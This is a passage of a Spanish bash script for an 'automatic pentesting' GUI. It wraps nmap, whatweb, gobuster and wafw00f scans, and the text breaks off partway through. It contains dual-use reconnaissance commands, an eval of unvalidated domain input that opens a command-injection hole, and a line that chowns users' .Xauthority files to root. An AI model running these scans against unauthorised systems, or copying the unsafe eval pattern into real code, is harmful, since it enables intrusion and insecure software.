#!/bin/bash
#date:09/06/22
#Autor:W1sfly (Juan Manuel Garcia)

#************************Colores*************************
green="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
#************************************************************

echo -e "\n${yellow}[!]${endColour} Puede tardar un poco en iniciarse la herramienta si no tiene instalado los recursos básicos para arrancar" 
sleep 2

#************************************************************

apt-get install yad > /dev/null 2>&1
apt-get install xmlstarlet > /dev/null 2>&1
apt-get install xsltproc > /dev/null 2>&1
apt-get install xdg-utils > /dev/null 2>&1
pip install censys > /dev/null 2>&1 #si falta theharvester no funciona
#ante un posible error al ejecutar xdg-open cambiamos lo siguiente, cambiando los permisos
xau=$(find /home -type f -name ".Xauthority")
chown root: $xau 2>/dev/null

#**********************Formato texto **************************
#\033[1m__________\033[0m

#Nº= 0 (normal) 1 (negrita) 2(dim)   4(subrayado)   5(parpadeo)     6(inverso)       8(invisible)


#***************CTRL+C*****************************
#función para que si presionamos un ctrl+c para parar, pare lo que esté realizando pero vuelva a la aplicación si quiero y no salga del programa directamente
trap ctrl_c INT
function ctrl_c(){
					yad --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
				    --center \
				    --width=250 \
				    --height=80 \
				    --text-align=center \
				    --button=Si:0 \
    				--button=No:1 \
				    --text="¿Salir de la herramienta?"
				ans=$?
				if [ $ans -eq 0 ]
				then
				    echo -e "\n${red}[!]Saliendo......${endColour}"
				    sleep 2
					tput cnorm; exit 1
				else
				    menu
				fi	
}


function linea(){
	for i in {1..80}; do echo -ne "${red}*"; done; echo -ne "${endColour}\n"
}


#*****************************************************representar tabla************************************************************************************************

function printTable(){

    local -r delimiter="${1}"
    local -r data="$(removeEmptyLines "${2}")"

    if [[ "${delimiter}" != '' && "$(isEmptyString "${data}")" = 'false' ]]
    then
        local -r numberOfLines="$(wc -l <<< "${data}")"

        if [[ "${numberOfLines}" -gt '0' ]]
        then
            local table=''
            local i=1

            for ((i = 1; i <= "${numberOfLines}"; i = i + 1))
            do
                local line=''
                line="$(sed "${i}q;d" <<< "${data}")"

                local numberOfColumns='0'
                numberOfColumns="$(awk -F "${delimiter}" '{print NF}' <<< "${line}")"

                if [[ "${i}" -eq '1' ]]
                then
                    table="${table}$(printf '%s#+' "$(repeatString '#+' "${numberOfColumns}")")"
                fi

                table="${table}\n"

                local j=1

                for ((j = 1; j <= "${numberOfColumns}"; j = j + 1))
                do
                    table="${table}$(printf '#| %s' "$(cut -d "${delimiter}" -f "${j}" <<< "${line}")")"
                done

                table="${table}#|\n"

                if [[ "${i}" -eq '1' ]] || [[ "${numberOfLines}" -gt '1' && "${i}" -eq "${numberOfLines}" ]]
                then
                    table="${table}$(printf '%s#+' "$(repeatString '#+' "${numberOfColumns}")")"
                fi
            done

            if [[ "$(isEmptyString "${table}")" = 'false' ]]
            then
                echo -e "${table}" | column -s '#' -t | awk '/^\+/{gsub(" ", "-", $0)}1'
            fi
        fi
    fi
}

function removeEmptyLines(){

    local -r content="${1}"
    echo -e "${content}" | sed '/^\s*$/d'
}

function repeatString(){

    local -r string="${1}"
    local -r numberToRepeat="${2}"

    if [[ "${string}" != '' && "${numberToRepeat}" =~ ^[1-9][0-9]*$ ]]
    then
        local -r result="$(printf "%${numberToRepeat}s")"
        echo -e "${result// /${string}}"
    fi
}

function isEmptyString(){

    local -r string="${1}"

    if [[ "$(trimString "${string}")" = '' ]]
    then
        echo 'true' && return 0
    fi

    echo 'false' && return 1
}

function trimString(){

    local -r string="${1}"
    sed 's,^[[:blank:]]*,,' <<< "${string}" | sed 's,[[:blank:]]*$,,'
}


#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


function directorio (){
	accion=$(yad --form --image imagenes/hacker-cat.svg --center --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" --center --text="Automatic Pentesting Tool" --button=Aceptar:0  --button=Cancelar:1 --width=400 --height=300 --field="Directorio:dir")
	bot=$?
	if [ $bot -eq 0 ]
		then
		dir=$(cut -d'|' -f1 <<< $accion) #quitamos con el -d la barra que se queda al final del fichero

	else
		menu
	fi
}

function ip_intro (){
	test='([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])'
						ipintro=$(yad --entry \
								--title="IP" \
					             --image=imagenes/icoip.ico \
					             --width=250 \
					             --height=80 \
					             --width=250 \
					             --button=Aceptar:0 \
					             --button=Cancelar:1 \
					             --center \
					             --text-align=center \
					             --text="Introduce IP")

									ans=$?
									if [ $ans -eq 0 ]
									then
										if [[ $ipintro =~ ^$test\.$test\.$test\.$test$ ]]  #valida si se ha introducido una IP
										then
									    	ip=$ipintro
										else
											texto="<span weight=\"bold\" foreground=\"red\">IP NO VÁLIDA</span>" #me muestra un error para que vuelva a meter la IP
											yad --title="ERROR" \
								    			--image=gtk-info \
								    			--width=250 \
								    			--height=80 \
								    			--button=OK:0 \
								    			--center \
								    			--text-align=center \
								    			--text="${texto}"

												ans=$?	

												if [ $ans -eq 0 ]								
													then
								    					ip_intro
												fi
										fi
									else
										menu
									
									fi

									}

function dom(){
						dominio=$(yad --entry \
					             --title="Dominio" \
					             --image=gtk-info \
					             --width=250 \
					             --height=80 \
					             --width=250 \
					             --button=Aceptar:0 \
					             --button=Cancelar:1 \
					             --center \
					             --text-align=center \
					             --text="Introduce un dominio")
					ans=$?
					if [ $ans -eq 0 ]
					then
					    domain=$dominio
					else
					    menu
					fi

}

function menu(){

	accion=$(yad --list --image imagenes/logomod.png --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" --text="Menú" --button="<span weight=\"bold\" foreground=\"green\">ACEPTAR</span>":0 --button="<span weight=\"bold\" foreground=\"red\">SALIR</span>":1 --center --width=700 --height=300 --separator= --column="Acciones" Recolectar Vulnerabilidades Explotación Password\ Cracking)

	case $accion in
		Recolectar)
			gathering
		;;
		Vulnerabilidades)
			vuln
		;;
		Explotación)
			exploit
		
		;;
		Password\ Cracking)
			Crackear
		;;
		*)
			salir
		;;
	esac

}

function gathering(){


	tools_rec=$(yad --center --width=700 --height=300 --list --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" --text="Recolección" --button=Aceptar:0 --button=Atrás:1 --separator= --column="Tools" Host\ activos\ red Ping Nmap WhatWeb GoBuster Wafw00f TheHarvester)

	case $tools_rec in
		Host\ activos\ red)
			Host_activos
		;;
		Ping)
			Ping
		;;
		Nmap)
			Nmap
		;;
		WhatWeb)
			whatweb
		;;
		GoBuster)
			gobuster
		;;
		Wafw00f)
			waf
		;;
		TheHarvester)
			theHarvester
		;;
		*)
			menu
		;;
	esac
}


			function Host_activos(){

				ip_intro
linea
echo -e "				
\t░█─░█ █▀▀█ █▀▀ ▀▀█▀▀ █▀▀ 　 █▀▀█ █▀▀ ▀▀█▀▀ ─▀─ ▀█─█▀ █▀▀█ █▀▀ 
\t░█▀▀█ █──█ ▀▀█ ──█── ▀▀█ 　 █▄▄█ █── ──█── ▀█▀ ─█▄█─ █──█ ▀▀█ 
\t░█─░█ ▀▀▀▀ ▀▀▀ ──▀── ▀▀▀ 　 ▀──▀ ▀▀▀ ──▀── ▀▀▀ ──▀── ▀▀▀▀ ▀▀▀"
linea
				hostred="nmap -sn $ip/24 -oX hostred.xml"
				eval $hostred > /dev/null 2>&1
				xmlstarlet sel -t -v "//address/@addr" -n hostred.xml
				rm -r hostred.xml
				gathering

			}



			function Ping(){

				ip_intro
				#con las siguientes instrucciones conseguimos que solo nos diga si se han perdido paquetes o no, evitando ver el proceso
echo -e "
\t\t\t█▀█ █ █▄░█ █▀▀
\t\t\t█▀▀ █ █░▀█ █▄█"
				echo -e "\n" #salto de linea
				linea
				echo -e "\tCOMPROBANDO conectividad............espere un momento"
				linea
				echo -e "\n"
				if [[ $(ping -c 4 $ip | grep ", 0% packet loss" | wc -l) > 0 ]] #wc -l cuenta numero de lineas
					then 
						echo -e "${green}El Ping ha sido satisfactorio${endColour}"  #ponemos el texto en color verde

						echo -e "\n"

						ttl=$(ping -c 1 $ip | grep "ttl=" | cut -d " " -f 6 | sed "s/ttl=//g") #me quedo con la linea donde está el ttl y quito "ttl" para que me quede solo el numero
			
							if [ $ttl -ge 0 -a $ttl -le 64 ]; then
								echo -e "Sistema Operativo --> \033[4mLINUX\033[0m"
							elif
								[ $ttl -ge 65 -a $ttl -le 128 ]; then
								echo -e "Sistema Operativo --> \033[4mWINDOWS\033[0m"
							else
								echo -e "Sistema Operativo --> \033[4mSOLARIS/AIX\033[0m"
							fi
							echo -e "\n"
							gathering		
						
					else 
						echo -e "${red}ERROR, hay fallos en la conectividad${endColour}"  #ponemos el texto en color rojo
				

				fi		
			}	

			

			function Nmap(){

				accion=$(yad --list --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" --text="NMAP" --center --width=700 --height=300 --button=Aceptar:0 --button=Atrás:1 --separator= --column="Tipo de escaneo" Normal Enumeración Autenticación)

				case $accion in

					Normal)
echo -e "
\t\t\t███╗░░██╗███╗░░░███╗░█████╗░██████╗░
\t\t\t████╗░██║████╗░████║██╔══██╗██╔══██╗
\t\t\t██╔██╗██║██╔████╔██║███████║██████╔╝	
\t\t\t██║╚████║██║╚██╔╝██║██╔══██║██╔═══╝░
\t\t\t██║░╚███║██║░╚═╝░██║██║░░██║██║░░░░░
\t\t\t╚═╝░░╚══╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░"
linea
echo -e "\n${yellow}[!]${endColour}\033[1mEl siguiente escaneo mostrará los puertos, versiones, servicios, sistema operativo del objetivo\033[1m\n"
linea
sleep 3

					yad --title="Nmap" \
						    --center \
						    --width=250 \
						    --height=80 \
						    --text-align=center \
						    --text="¿Que deseas introducir?" \
						    --button="Una IP":0 \
						    --button="Un dominio":1
						ans=$?
						if [ $ans -eq 0 ]
						then
						    ip_intro
						    directorio 2>/dev/null
							

											echo -e "\t\tEscaneando el objetivo IP: \033[4m$ip\033[0m"
											mkdir $dir/escaneo 2>/dev/null	
											echo -e "\t\t\t...análisis en ejecución..."
											linea
											echo -e "\n"

											ins="nmap -p- -T5 -sV -O -n $ip -oA $dir/escaneo/nmap"
											eval $ins  > /dev/null 2>&1 #ocultamos la salida
											
											if [[ $(xmlstarlet sel -t -v "//host/status/@state" -n $dir/escaneo/nmap.xml) == "up" ]] #comprobamos si la IP está up o down
					              				then

					                				echo -e "${green}Host: $ip --> UP${endColour}"
					                				echo -e "\n"
					           

					               					 port=$(xsltproc $dir/escaneo/nmap.xml | grep -e '<tr class="open">' -A 1 | grep -v -e '<tr class="open">' -e '--')

					                				echo "PuertosAbiertos_Protocolo_Servicio_Versión" > u.table
					                
					                					for puerto in $port; do

					                  						echo "${puerto}_$(xsltproc $dir/escaneo/nmap.xml | grep -e "$puerto" -A 1 | tail -n 1)_$(xsltproc $dir/escaneo/nmap.xml | grep -e "$puerto" -A 3 | tail -n 1)_$(xsltproc $dir/escaneo/nmap.xml | grep -e "$puerto" -A 7 | tail -n 3 | xargs)" >> u.table  # con xargs lo pongo todo en la misma linea
					                					
					                					done

					                		printTable '_' "$(sed -e "s/<td>//g" -e "s/<\/td>//g" u.table)" # con el sed quitamos las etiquetas td, para escapar el caracter "/" ponemos \/, para eliminar todos los tag ---> sed -e :a -e 's/<[^>]*>//g;/</N;//ba'
					          							

					          							echo -e "\n"
					                		so=$(xsltproc $dir/escaneo/nmap.xml | sed -e :a -e 's/<[^>]*>//g;/</N;//ba' | grep "OS match:" | cut -d " " -f 3- | sed 's/......$//g') # con sed quitamos todos los tag, con grep nos quedamos con la linea del sistema operativo, con cut visualizamos desde el campo 3, con sed quitamos los ultimos caracteres que no nos interesa
					            			echo -e "${gray}S.O --> $so${endColour}\n"
					            			gathering
					              else
					                echo -e "${red}$ip --> DOWN${endColour}"
					                gathering
					            fi
						else
						    dom
						    directorio 2>/dev/null
							

											echo -e "\t\tEscaneando el objetivo: \033[4m$domain\033[0m"
											mkdir $dir/escaneo 2>/dev/null	
											echo -e "\t\t\t...análisis en ejecución..."
											linea
											echo -e "\n"

											ins="nmap -p- -T5 -sV -O -n $domain -oA $dir/escaneo/nmap"
											eval $ins  > /dev/null 2>&1 #ocultamos la salida
											
											if [[ $(xmlstarlet sel -t -v "//host/status/@state" -n $dir/escaneo/nmap.xml) == "up" ]] #comprobamos si la IP está up o down
					              				then

					                				echo -e "${green}Host: $domain --> UP${endColour}"
					                				echo -e "\n"
					           

					               					 port=$(xsltproc $dir/escaneo/nmap.xml | grep -e '<tr class="open">' -A 1 | grep -v -e '<tr class="open">' -e '--')

					                				echo "PuertosAbiertos_Protocolo_Servicio_Versión" > u.table
					                
					                					for puerto in $port; do

					                  						echo "${puerto}_$(xsltproc $dir/escaneo/nmap.xml | grep -e "$puerto" -A 1 | tail -n 1)_$(xsltproc $dir/escaneo/nmap.xml | grep -e "$puerto" -A 3 | tail -n 1)_$(xsltproc $dir/escaneo/nmap.xml | grep -e "$puerto" -A 7 | tail -n 3 | xargs)" >> u.table  # con xargs lo pongo todo en la misma linea
					                					
					                					done

					                		printTable '_' "$(sed -e "s/<td>//g" -e "s/<\/td>//g" u.table)" # con el sed quitamos las etiquetas td, para escapar el caracter "/" ponemos \/, para eliminar todos los tag ---> sed -e :a -e 's/<[^>]*>//g;/</N;//ba'
					          							

					          							echo -e "\n"
					                		so=$(xsltproc $dir/escaneo/nmap.xml | sed -e :a -e 's/<[^>]*>//g;/</N;//ba' | grep "OS match:" | cut -d " " -f 3- | sed 's/......$//g') # con sed quitamos todos los tag, con grep nos quedamos con la linea del sistema operativo, con cut visualizamos desde el campo 3, con sed quitamos los ultimos caracteres que no nos interesa
					            			echo -e "${gray}S.O --> $so${endColour}\n"
					            			gathering
					              else
					                echo -e "${red}$domain --> DOWN${endColour}"
					                gathering
					            fi
						fi
					
				
					;;




					Enumeración)
echo -e "
\t\t\t███╗░░██╗███╗░░░███╗░█████╗░██████╗░
\t\t\t████╗░██║████╗░████║██╔══██╗██╔══██╗
\t\t\t██╔██╗██║██╔████╔██║███████║██████╔╝	
\t\t\t██║╚████║██║╚██╔╝██║██╔══██║██╔═══╝░
\t\t\t██║░╚███║██║░╚═╝░██║██║░░██║██║░░░░░
\t\t\t╚═╝░░╚══╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░"
linea
echo -e "\n${yellow}[!]${endColour}\033[1mEl siguiente escaneo realizará un análisis con los scripts por defecto\033[1m\n"
linea
sleep 3

						yad --title="Nmap" \
						    --center \
						    --width=250 \
						    --height=80 \
						    --text-align=center \
						    --text="¿Que deseas introducir?" \
						    --button="Una IP":0 \
						    --button="Un dominio":1
						ans=$?
						if [ $ans -eq 0 ]
						then
									ip_intro
									directorio 2>/dev/null
									
									yad --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
									    --center \
									    --width=250 \
									    --height=80 \
									    --text-align=center \
									    --text="Elige el modo:" \
									    --button="Introducir manualmente los puertos a escanear":0 \
									    --button="Escanear todo el rango de puertos":1
									ans=$?
									if [ $ans -eq 0 ]
									then
										puerto=$(yad --entry \
									             --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
									             --image=gtk-info \
									             --width=250 \
									             --height=80 \
									             --width=250 \
									             --button="Aceptar":0 \
									             --center \
									             --text-align=center \
									             --text="Introduce a continuación los puertos que quieres escanear")
														ans=$?
														if [ $ans -eq 0 ]
														then
															es_numero='^[0-9,]+$' # solo podremos introducir numeros y comas
															if [[ $puerto =~ $es_numero ]] ; then
																echo -e "\t\tEscaneando el objetivo IP: \033[4m$ip\033[0m"
																mkdir $dir/escaneo 2>/dev/null	
																echo -e "\t\t\t...análisis en ejecución..."
																linea
																echo -e "\n"

															   ins="nmap -p$puerto -sC $ip -oA $dir/escaneo/nmapenum"
														   		eval $ins
														   		gathering
															 else
															 	echo -e "${yellow}[!]${endColour}ERROR, hay que introducir números separados con comas\n Ejemplo: 20,80,21"
															 	gathering
															fi
														    
														else
														    gathering
														fi
									    
									else
										echo -e "\t\tEscaneando el objetivo IP: \033[4m$ip\033[0m"
										mkdir $dir/escaneo 2>/dev/null	
										echo -e "\t\t\t...análisis en ejecución..."
										linea
										echo -e "\n"

									    ins="nmap -p- -sC $ip -oA $dir/escaneo/nmapenum"
										eval $ins
										gathering
						fi
						else
						   
									dom
									directorio 2>/dev/null
										

									
									yad --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
									    --center \
									    --width=250 \
									    --height=80 \
									    --text-align=center \
									    --text="Elige el modo:" \
									    --button="Introducir manualmente los puertos a escanear":0 \
									    --button="Escanear todo el rango de puertos":1
									ans=$?
									if [ $ans -eq 0 ]
									then
										puerto=$(yad --entry \
									             --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
									             --image=gtk-info \
									             --width=250 \
									             --height=80 \
									             --width=250 \
									             --button="Aceptar":0 \
									             --center \
									             --text-align=center \
									             --text="Introduce a continuación los puertos que quieres escanear")
														ans=$?
														if [ $ans -eq 0 ]
														then
															es_numero='^[0-9,]+$' # solo podremos introducir numeros y comas
															if [[ $puerto =~ $es_numero ]] ; then
																echo -e "\t\tEscaneando el objetivo: \033[4m$domain\033[0m"
																mkdir $dir/escaneo 2>/dev/null	
																echo -e "\t\t\t...análisis en ejecución..."
																linea
																echo -e "\n"

															   ins="nmap -p$puerto -sC $domain -oA $dir/escaneo/nmapenum"
														   		eval $ins
														   		gathering
															 else
															 	echo -e "${yellow}[!]${endColour}ERROR, hay que introducir números separados con comas\n Ejemplo: 20,80,21"
															 	gathering
															fi
														    
														else
														    gathering
														fi
									    
									else
										echo -e "\t\tEscaneando el objetivo: \033[4m$domain\033[0m"
										mkdir $dir/escaneo 2>/dev/null	
										echo -e "\t\t\t...análisis en ejecución..."
										linea
										echo -e "\n"

									    ins="nmap -p- -sC $domain -oA $dir/escaneo/nmapenum"
										eval $ins
										gathering
									fi
						fi

					
					;;

					Autenticación)
echo -e "
\t\t\t███╗░░██╗███╗░░░███╗░█████╗░██████╗░
\t\t\t████╗░██║████╗░████║██╔══██╗██╔══██╗
\t\t\t██╔██╗██║██╔████╔██║███████║██████╔╝	
\t\t\t██║╚████║██║╚██╔╝██║██╔══██║██╔═══╝░
\t\t\t██║░╚███║██║░╚═╝░██║██║░░██║██║░░░░░
\t\t\t╚═╝░░╚══╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░"
linea
echo -e "\n${yellow}[!]${endColour}\033[1mEl siguiente escaneo ejecutará todos los scripts disponibles para autenticación\033[1m\n"
linea
sleep 3

						yad --title="Nmap" \
						    --center \
						    --width=250 \
						    --height=80 \
						    --text-align=center \
						    --text="¿Que deseas introducir?" \
						    --button="Una IP":0 \
						    --button="Un dominio":1
						ans=$?
						if [ $ans -eq 0 ]
						then
									ip_intro
									directorio 2>/dev/null
										
									
									yad --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
									    --center \
									    --width=250 \
									    --height=80 \
									    --text-align=center \
									    --text="Elige el modo:" \
									    --button="Introducir manualmente los puertos a escanear":0 \
									    --button="Escanear todo el rango de puertos":1
									ans=$?
									if [ $ans -eq 0 ]
									then
										puerto=$(yad --entry \
									             --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
									             --image=gtk-info \
									             --width=250 \
									             --height=80 \
									             --width=250 \
									             --button="Aceptar":0 \
									             --center \
									             --text-align=center \
									             --text="Introduce a continuación los puertos que quieres escanear")
														ans=$?
														if [ $ans -eq 0 ]
														then
															es_numero='^[0-9,]+$' # solo podremos introducir numeros y comas
															if [[ $puerto =~ $es_numero ]] ; then
																echo -e "\t\tEscaneando el objetivo IP: \033[4m$ip\033[0m"
																mkdir $dir/escaneo 2>/dev/null	
																echo -e "\t\t\t...análisis en ejecución..."
																linea
																echo -e "\n"

															   ins="nmap -p$puerto --script=auth $ip -oA $dir/escaneo/nmapauth"
														   		eval $ins
														   		gathering
															 else
															 	echo -e "${yellow}[!]${endColour}ERROR, hay que introducir números separados con comas\n Ejemplo: 20,80,21"
															 	gathering
															fi
														    
														else
														    gathering
														fi
									    
									else
										echo -e "\t\tEscaneando el objetivo IP: \033[4m$ip\033[0m"
										mkdir $dir/escaneo 2>/dev/null	
										echo -e "\t\t\t...análisis en ejecución..."
										linea
										echo -e "\n"

									    ins="nmap -p- --script=auth $ip -oA $dir/escaneo/nmapauth"
										eval $ins
										gathering
									fi
						else
						   
									dom
									directorio 2>/dev/null
										
									
									yad --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
									    --center \
									    --width=250 \
									    --height=80 \
									    --text-align=center \
									    --text="Elige el modo:" \
									    --button="Introducir manualmente los puertos a escanear":0 \
									    --button="Escanear todo el rango de puertos":1
									ans=$?
									if [ $ans -eq 0 ]
									then
										puerto=$(yad --entry \
									             --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
									             --image=gtk-info \
									             --width=250 \
									             --height=80 \
									             --width=250 \
									             --button="Aceptar":0 \
									             --center \
									             --text-align=center \
									             --text="Introduce a continuación los puertos que quieres escanear")
														ans=$?
														if [ $ans -eq 0 ]
														then
															es_numero='^[0-9,]+$' # solo podremos introducir numeros y comas
															if [[ $puerto =~ $es_numero ]] ; then
																echo -e "\t\tEscaneando el objetivo: \033[4m$domain\033[0m"
																mkdir $dir/escaneo 2>/dev/null	
																echo -e "\t\t\t...análisis en ejecución..."
																linea
																echo -e "\n"

															   ins="nmap -p$puerto --script=auth $domain -oA $dir/escaneo/nmapauth"
														   		eval $ins
														   		gathering
															 else
															 	echo -e "${yellow}[!]${endColour}ERROR, hay que introducir números separados con comas\n Ejemplo: 20,80,21"
															 	gathering
															fi
														    
														else
														    gathering
														fi
									    
									else
										echo -e "\t\tEscaneando el objetivo: \033[4m$domain\033[0m"
										mkdir $dir/escaneo 2>/dev/null	
										echo -e "\t\t\t...análisis en ejecución..."
										linea
										echo -e "\n"

									    ins="nmap -p- --script=auth $domain -oA $dir/escaneo/nmapauth"
										eval $ins
										gathering
									fi
						fi


					;;
					*)
					gathering
					;;
					esac
							
			}


			function whatweb(){

echo -e "
\t\t░█──░█ █──█ █▀▀█ ▀▀█▀▀ ░█──░█ █▀▀ █▀▀▄ 
\t\t░█░█░█ █▀▀█ █▄▄█ ──█── ░█░█░█ █▀▀ █▀▀▄ 
\t\t░█▄▀▄█ ▀──▀ ▀──▀ ──▀── ░█▄▀▄█ ▀▀▀ ▀▀▀─"
linea

				url=$(yad --entry \
								--title="WhatWeb" \
					             --width=250 \
					             --height=80 \
					             --width=250 \
					             --button=Aceptar:0 \
					             --center \
					             --text-align=center \
					             --text="Introduce la URL")

									ans=$?
									if [ $ans -eq 0 ]
									then
										sudo whatweb -v $url | sed "s/,/\n/g"
										gathering
									else 
										menu
									fi
			}	



	function gobuster(){

				accion=$(yad --list --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" --text="Gobuster" --center --width=700 --height=300 --button=Aceptar:0 --button=Atrás:1 --separator= --column="Opciones" Directorios\ Ficheros Subdominios )

				case $accion in

					Directorios\ Ficheros)
echo -e "				
\t\t█████▀███████████████████████████████████████████
\t\t█─▄▄▄▄█─▄▄─█▄─▄─▀█▄─██─▄█─▄▄▄▄█─▄─▄─█▄─▄▄─█▄─▄▄▀█
\t\t█─██▄─█─██─██─▄─▀██─██─██▄▄▄▄─███─████─▄█▀██─▄─▄█
\t\t▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀"
linea

								url=$(yad --entry \
											--title="Directorio y Ficheros" \
								             --width=250 \
								             --height=80 \
								             --width=250 \
								             --button=Aceptar:0 \
								             --center \
								             --text-align=center \
								             --text="Introduce la URL/IP")

												ans=$?
												if [ $ans -eq 0 ]
												then
													address=$url
												else 
													menu
												fi

								archivo=$(yad --file \
								              --title="Directorio y Ficheros" \
								              --height=200 \
								              --width=100 \
								              --center \
								              --text="Selecciona el diccionario a utilizar:" \
								              --file-filter="scripts | *.txt")
													
													ans=$?
													if [ $ans -eq 0 ]
													then
													    txt=$archivo
													else
													    menu
													fi

								sudo gobuster dir -t 200 -w $txt -u $address -x php,txt,html 2>/dev/null
								gathering
					;;

					Subdominios)
echo -e "				
\t\t█████▀███████████████████████████████████████████
\t\t█─▄▄▄▄█─▄▄─█▄─▄─▀█▄─██─▄█─▄▄▄▄█─▄─▄─█▄─▄▄─█▄─▄▄▀█
\t\t█─██▄─█─██─██─▄─▀██─██─██▄▄▄▄─███─████─▄█▀██─▄─▄█
\t\t▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀"
linea

								url=$(yad --entry \
													--title="Subdominios" \
										             --width=250 \
										             --height=80 \
										             --width=250 \
										             --button=Aceptar:0 \
										             --center \
										             --text-align=center \
										             --text="Introduce un dominio")

														ans=$?
														if [ $ans -eq 0 ]
														then
															address=$url
														else 
															menu
														fi

										archivo=$(yad --file \
										              --title="Subdominios" \
										              --height=200 \
										              --width=100 \
										              --center \
										              --text="Selecciona el diccionario a utilizar:" \
										              --file-filter="scripts | *.txt")
															
															ans=$?
															if [ $ans -eq 0 ]
															then
															    txt=$archivo
															else
															    menu
															fi

										sudo gobuster vhost -u $address -w $txt 2>/dev/null
										gathering

					;;
					*)
					gathering
					;;
					esac
							
			}


			function waf(){
echo -e "												
\t\t░█──░█ █▀▀█ █▀▀ █───█ █▀▀█ █▀▀█ █▀▀ 
\t\t░█░█░█ █▄▄█ █▀▀ █▄█▄█ █▄▀█ █▄▀█ █▀▀ 
\t\t░█▄▀▄█ ▀──▀ ▀── ─▀─▀─ █▄▄█ █▄▄█ ▀──"
linea
sleep 1
echo -e "${yellow}[!]${endColour}Espere un momento mientras se comprueba que la herramienta se encuentra instalada\n"
sleep 1
echo -e "${yellow}[!]${endColour}El proceso puede demorarse ya que la búsqueda la realiza desde la raiz del sistema\n"
sleep 1
echo -e "${yellow}[!]${endColour}Wait please.........."
sleep 1
linea
echo -e "
\t\t__________________¶________________¶
\t\t_________________¶¶________________¶¶
\t\t_______________¶¶¶__________________¶¶¶
\t\t_____________¶¶¶¶____________________¶¶¶¶
\t\t____________¶¶¶¶¶____________________¶¶¶¶¶
\t\t___________¶¶¶¶¶______________________¶¶¶¶¶
\t\t__________¶¶¶¶¶¶______________________¶¶¶¶¶¶
\t\t__________¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶
\t\t__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\t\t___________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\t\t____________¶¶¶¶¶¶¶¶____¶¶¶¶¶¶____¶¶¶¶¶¶¶¶
\t\t___¶________¶¶¶¶¶¶¶______¶¶¶¶______¶¶¶¶¶¶¶
\t\t___¶_______¶¶¶¶¶¶¶¶___O_¶¶¶¶¶__O__¶¶¶¶¶¶¶¶
\t\t__¶¶¶______¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶
\t\t__¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\t\t_¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶
\t\t_¶¶¶¶¶____¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶
\t\t___¶¶_____¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶
\t\t___¶¶______¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶
\t\t____¶¶______¶¶________¶¶¶¶¶¶¶¶¶¶_______¶¶
